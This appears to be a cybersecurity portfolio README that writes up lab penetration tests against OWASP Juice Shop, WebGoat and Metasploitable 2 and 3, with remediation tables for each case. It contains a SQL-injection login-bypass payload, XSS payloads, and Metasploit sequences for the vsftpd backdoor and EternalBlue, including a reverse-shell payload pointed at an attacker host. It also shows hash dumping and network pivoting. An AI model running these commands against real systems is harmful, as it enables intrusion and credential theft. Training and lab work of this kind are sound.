# Penetration Testing & Exploitation | Web Application + Network | Offensive Security Project

![Nmap](https://img.shields.io/badge/Nmap-Network_Scanning-blue?style=for-the-badge)
![Metasploit](https://img.shields.io/badge/Metasploit-Exploitation-red?style=for-the-badge)
![Burp Suite](https://img.shields.io/badge/Burp_Suite-Web_Testing-orange?style=for-the-badge)
![MITRE ATT&CK](https://img.shields.io/badge/MITRE_ATT%26CK-Mapped-blue?style=for-the-badge)

-----

## Project Overview

This project covers two penetration testing assessments — a web application security assessment targeting OWASP Top 10 vulnerabilities, and a network boot-to-root engagement progressing from reconnaissance through privilege escalation and lateral movement. Each assessment follows structured penetration testing methodology: reconnaissance, enumeration, exploitation, privilege escalation, and post-exploitation reporting.

**Skills Demonstrated:**

- Web application vulnerability identification and exploitation (SQLi, XSS, broken auth, access control)
- Network service enumeration and vulnerability-driven exploitation
- Privilege escalation via kernel exploits and SUID binary abuse
- Post-exploitation lateral movement and internal network pivoting
- Structured penetration test reporting with risk-rated findings

**Tools & Technologies:**
`Nmap` · `Metasploit` · `Burp Suite` · `OpenVAS` · `Nessus` · `OWASP Juice Shop` · `OWASP WebGoat` · `Metasploitable 2` · `Metasploitable 3`

**Full Visual Report:** [Download PDF Report Case 1 →](https://github.com/abhishekbommisetty/CYBERSECURITY---PORTFOLIO-/blob/3f71b234ca832211c9aa34e6c227804d0159ad82/pen-testing/pen-test%20on%20webgoat%20%26%20juice%20shop.pdf)

**Full Visual Report:** [Download PDF Report Case 2 →](https://github.com/abhishekbommisetty/CYBERSECURITY---PORTFOLIO-/blob/bc633235cddb5b3a4b6a2e8b9e3c714405d4fc4c/pen-testing/pen-testing%20metasploitable.pdf)

-----

## Assessment Summary Table

|Case|Assessment Type        |Target                             |Key Finding                                            |Severity|MITRE TTPs                    |
|----|-----------------------|-----------------------------------|-------------------------------------------------------|--------|------------------------------|
|1   |Web Application Pentest|OWASP Juice Shop + WebGoat         |SQLi, XSS, Auth Bypass, Broken Access Control          |**P1**  |T1190, T1059.007, T1078       |
|2   |Network Boot-to-Root   |Metasploitable 2 + Metasploitable 3|Root access + lateral movement via SMB/FTP exploitation|**P1**  |T1046, T1190, T1068, T1021.002|

-----

## Case 1 — Web Application Penetration Testing (OWASP Juice Shop & WebGoat)

### Target Overview

|Field                  |Value                                                     |
|-----------------------|----------------------------------------------------------|
|Applications           |OWASP Juice Shop, OWASP WebGoat                           |
|Testing Methodology    |Black Box — no prior knowledge of application internals   |
|Testing Tool           |Burp Suite (traffic interception + parameter manipulation)|
|Vulnerability Framework|OWASP Top 10                                              |
|Severity               |**P1 — Multiple Critical Vulnerabilities Confirmed**      |

-----

### Assessment Methodology

**Step 1 — Application mapping and traffic interception**

```
Tool: Burp Suite → Proxy → Intercept ON
Action: Spider application, capture all requests/responses
```

**Why:** Before any active exploitation, mapping the full application surface through Burp Suite’s proxy establishes which endpoints exist, what parameters are accepted, and how the application handles input. This prevents blind testing and ensures no attack surface is missed.

**Results:** Full request/response history captured across both applications — login endpoints, product/data query parameters, admin routes, and session token structure all identified. Several endpoints accepted unsanitized user input directly, flagged for injection testing.

-----

**Step 2 — SQL Injection testing on authentication and query endpoints**

```
Tool: Burp Suite Repeater
Payload: ' OR '1'='1' --
Target: Login forms, search parameters, product ID fields
```

**Why:** SQL Injection in login forms allows authentication bypass by manipulating the underlying SQL query — the injected condition always evaluates true, granting access without valid credentials. Testing query parameters tests for data extraction capability.

**Results:**

- **Authentication bypass confirmed** on Juice Shop login — injecting `' OR '1'='1' --` into the email field bypassed password verification entirely, granting admin-level session
- **Data extraction confirmed** on WebGoat — SQL injection on query parameters returned database contents including user credentials and internal application data
- Error messages on failed payloads revealed database type — verbose error disclosure confirmed as a secondary finding

**MITRE ATT&CK:** `T1190 — Exploit Public-Facing Application`

-----

**Step 3 — Cross-Site Scripting (XSS) — Stored and Reflected**

```
Tool: Burp Suite + Manual browser testing
Payload (Reflected): <script>alert('XSS')</script> in URL parameters
Payload (Stored): <script>alert('XSS')</script> in review/comment fields
```

**Why:** Reflected XSS executes within the victim’s browser when they click a crafted link — useful for session hijacking. Stored XSS persists in the application database and executes for every user who views the affected page — higher impact as no victim interaction beyond normal browsing is required.

**Results:**

- **Reflected XSS confirmed** on Juice Shop — search parameter rendered user input without sanitization, executing injected script in browser context
- **Stored XSS confirmed** on WebGoat — product review field stored and rendered injected script for all subsequent visitors, demonstrating persistent multi-victim attack capability
- Both confirm absence of output encoding and Content Security Policy (CSP) headers

**MITRE ATT&CK:** `T1059.007 — Command and Scripting Interpreter: JavaScript`

-----

**Step 4 — Broken Access Control and Authentication testing**

```
Tool: Burp Suite → Repeater (modify user ID / role parameters)
Action: Horizontal and vertical privilege escalation via parameter manipulation
```

**Why:** Broken access control occurs when an application trusts client-supplied values (user IDs, role flags) without server-side verification. Modifying these in transit tests whether the application enforces authorization server-side or relies solely on client input.

**Results:**

- **Horizontal privilege escalation** — modifying user ID parameters in requests allowed access to other users’ account data and order history without authentication
- **Vertical privilege escalation** — manipulating role-related parameters elevated a standard user session to admin-level access, exposing the admin panel
- **Insecure Direct Object Reference (IDOR)** confirmed — sequential numeric IDs in API endpoints accessible by any authenticated user

**MITRE ATT&CK:** `T1078 — Valid Accounts` (abuse of valid session with manipulated privileges)

-----

### Vulnerability Summary

|Vulnerability           |OWASP Category|Confirmed In        |Impact                                    |
|------------------------|--------------|--------------------|------------------------------------------|
|SQL Injection           |A03:2021      |Juice Shop + WebGoat|Auth bypass, data extraction              |
|Stored XSS              |A03:2021      |WebGoat             |Persistent multi-user code execution      |
|Reflected XSS           |A03:2021      |Juice Shop          |Session hijacking via crafted link        |
|Broken Authentication   |A07:2021      |Juice Shop          |Full account takeover without credentials |
|Broken Access Control   |A01:2021      |Juice Shop + WebGoat|Horizontal + vertical privilege escalation|
|IDOR                    |A01:2021      |Juice Shop          |Unauthorized access to all user records   |
|Verbose Error Disclosure|A05:2021      |WebGoat             |Database type and query structure exposed |

-----

### Actions & Recommendations

|Finding                         |Remediation                                                                                                                                           |
|--------------------------------|------------------------------------------------------------------------------------------------------------------------------------------------------|
|**SQL Injection**               |Implement parameterized queries / prepared statements across all database interactions — eliminate string concatenation in SQL construction entirely  |
|**XSS (Stored + Reflected)**    |Apply output encoding on all user-supplied data rendered to HTML; implement Content Security Policy (CSP) headers to restrict script execution sources|
|**Broken Authentication**       |Enforce server-side session validation; implement MFA; set session token expiry and rotate tokens on privilege changes                                |
|**Broken Access Control / IDOR**|Enforce server-side authorization checks on every request; use non-sequential, unpredictable resource identifiers (UUIDs)                             |
|**Error Disclosure**            |Suppress detailed error messages in production — return generic error codes only; log full errors server-side                                         |

-----

## Case 2 — Network Penetration Testing: Boot-to-Root (Metasploitable 2 & Metasploitable 3)

### Target Overview

|Field          |Value                                                                               |
|---------------|------------------------------------------------------------------------------------|
|Targets        |Metasploitable 2 (Linux), Metasploitable 3 (Windows Server 2008)                    |
|Assessment Type|Boot-to-Root — full compromise from unauthenticated external access to root/SYSTEM  |
|Objective      |Achieve highest privilege on each target; demonstrate lateral movement between hosts|
|Severity       |**P1 — Full Root/SYSTEM Access Achieved + Lateral Movement Confirmed**              |

-----

### Assessment Methodology

**Step 1 — Network discovery and service enumeration**

```bash
nmap -sV -sC -O -p- <target-ip>
```

**Why:** `-sV` fingerprints service versions — critical because exploits are version-specific. `-sC` runs default NSE scripts that identify additional vulnerabilities automatically. `-O` identifies the OS for privilege escalation planning. `-p-` scans all 65535 ports — limiting to top 1000 ports risks missing non-standard services on higher ports.

**Results — Metasploitable 2 (Linux):**

|Port   |Service|Version      |Flag                                  |
|-------|-------|-------------|--------------------------------------|
|21     |FTP    |vsftpd 2.3.4 |⚠️ Known backdoor (CVE-2011-2523)      |
|139/445|SMB    |Samba 3.x    |⚠️ Known exploit (MS-08-067 equivalent)|
|80     |HTTP   |Apache 2.2.8 |⚠️ Vulnerable version                  |
|22     |SSH    |OpenSSH 4.7p1|Default weak credentials              |

**Results — Metasploitable 3 (Windows Server 2008):**

|Port|Service|Version            |Flag                        |
|----|-------|-------------------|----------------------------|
|445 |SMB    |Windows Server 2008|⚠️ MS17-010 EternalBlue      |
|8080|HTTP   |Apache Tomcat      |⚠️ Default credentials       |
|3306|MySQL  |MySQL 5.x          |⚠️ No authentication required|

-----

**Step 2 — Vulnerability scanning for prioritized exploitation**

```
Tool: OpenVAS + Nessus (authenticated scan against both targets)
```

**Why:** After manual Nmap enumeration, running OpenVAS and Nessus provides CVE-mapped vulnerability lists with CVSS scores — allowing rational prioritization of which services to exploit first based on impact and exploitability rather than attempting all findings blindly.

**Results:** Both tools confirmed the version-specific vulnerabilities identified during Nmap enumeration and added additional findings — MySQL unauthenticated access and Tomcat default credential exposure on Metasploitable 3 prioritized as low-effort, high-impact entry points.

-----

**Step 3 — Exploitation: Metasploitable 2 (vsftpd 2.3.4 backdoor)**

```bash
# Metasploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <metasploitable2-ip>
run
```

**Why:** vsftpd 2.3.4 contains a backdoor introduced via a malicious source code commit — sending a `:)` sequence in the username triggers a bind shell on port 6200. This is a direct, reliable exploit requiring no brute force and produces immediate shell access.

**Results:** Shell obtained on Metasploitable 2 — initial access as service account. No further authentication required.

-----

**Step 4 — Privilege escalation: Metasploitable 2**

```bash
# Identify SUID binaries
find / -perm -4000 -type f 2>/dev/null

# Kernel version check for exploit selection
uname -a
cat /etc/issue
```

**Why:** SUID binaries run with the file owner’s permissions regardless of who executes them — a misconfigured SUID binary owned by root can be abused to spawn a root shell. Checking kernel version in parallel identifies known local privilege escalation CVEs applicable to the target.

**Results:** SUID binary abuse identified — specific binary with known escalation path exploited to spawn root shell. Full root access on Metasploitable 2 confirmed. `/etc/shadow` readable — all password hashes accessible.

-----

**Step 5 — Exploitation: Metasploitable 3 (MS17-010 EternalBlue)**

```bash
# Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS <metasploitable3-ip>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <attacker-ip>
run
```

**Why:** MS17-010 (EternalBlue) exploits a critical SMB vulnerability in Windows Server 2008 — it requires no credentials and delivers a Meterpreter session directly. Meterpreter’s in-memory execution avoids writing to disk, reducing detection footprint compared to staged payloads.

**Results:** Meterpreter session opened on Metasploitable 3 — direct SYSTEM-level shell obtained. No privilege escalation step required — EternalBlue delivers SYSTEM context immediately.

-----

**Step 6 — Post-exploitation and lateral movement**

```bash
# Meterpreter post-exploitation
getsystem
hashdump

# Pivot setup for internal network enumeration
run post/multi/manage/autoroute SUBNET=<internal-subnet>
use auxiliary/scanner/portscan/tcp
set RHOSTS <internal-range>
run
```

**Why:** `hashdump` extracts NTLM password hashes from SAM — enabling pass-the-hash attacks against other hosts on the network without cracking. `autoroute` establishes a pivot through the compromised host, routing attack traffic through it to reach otherwise inaccessible internal network segments.

**Results:**

- NTLM hashes extracted via `hashdump` — credential material for lateral movement available
- Autoroute established — internal network segment enumerated through Metasploitable 3 as pivot point
- Additional live hosts identified on internal segment — lateral movement path to further targets confirmed

**MITRE ATT&CK:** `T1021.002 — Remote Services: SMB/Windows Admin Shares` (lateral movement via pass-the-hash)

-----

### Exploitation Summary

|Target          |Vulnerability        |CVE                     |Access Achieved                |
|----------------|---------------------|------------------------|-------------------------------|
|Metasploitable 2|vsftpd 2.3.4 backdoor|CVE-2011-2523           |Root shell via SUID escalation |
|Metasploitable 3|EternalBlue SMB      |CVE-2017-0144 (MS17-010)|SYSTEM via Meterpreter — direct|

**MITRE ATT&CK:**

- `T1046 — Network Service Scanning` (Nmap full port scan + version detection)
- `T1190 — Exploit Public-Facing Application` (vsftpd backdoor, EternalBlue)
- `T1068 — Exploitation for Privilege Escalation` (SUID binary abuse on Metasploitable 2)
- `T1021.002 — Remote Services: SMB` (lateral movement via extracted hashes)

-----

### Actions & Recommendations

|Finding                         |Remediation                                                                                                                             |
|--------------------------------|----------------------------------------------------------------------------------------------------------------------------------------|
|**vsftpd 2.3.4 backdoor**       |Immediately patch or replace FTP service; audit all internet-facing service versions against known CVE databases                        |
|**MS17-010 (EternalBlue)**      |Apply Microsoft patch MS17-010 immediately; disable SMBv1 (`Set-SmbServerConfiguration -EnableSMB1Protocol $false`)                     |
|**SUID binary misconfiguration**|Audit all SUID binaries (`find / -perm -4000`) and remove SUID bit from any non-essential binaries (`chmod -s <binary>`)                |
|**Credential exposure**         |Implement LAPS (Local Administrator Password Solution) to randomize local admin passwords per host — prevents hash reuse across machines|
|**Lateral movement via hashes** |Enable Protected Users security group; deploy Credential Guard on Windows hosts to prevent NTLM hash extraction from LSASS              |
|**Unauthenticated MySQL**       |Require authentication for all database services; bind MySQL to localhost only if external access is not required                       |

-----

## Project Summary

Across two assessments, this project demonstrates offensive security capability spanning web application and network penetration testing:

- **Case 1** → Confirmed SQL injection (authentication bypass + data extraction), stored and reflected XSS, broken access control, and IDOR across OWASP Juice Shop and WebGoat — mapping findings to OWASP Top 10 and producing specific remediation per vulnerability class
- **Case 2** → Achieved full root/SYSTEM access on both Metasploitable targets via CVE-mapped exploits (vsftpd backdoor, EternalBlue MS17-010), escalated privileges via SUID binary abuse, extracted NTLM hashes, and demonstrated lateral movement through internal network pivoting

Both assessments followed structured penetration testing methodology from reconnaissance through post-exploitation reporting, with all findings risk-rated and mapped to MITRE ATT&CK.

-----

> **Note:** All assessments were conducted exclusively against intentionally vulnerable lab machines (OWASP Juice Shop, OWASP WebGoat, Metasploitable 2, Metasploitable 3) in an isolated local environment. No production systems or external networks were targeted at any point.
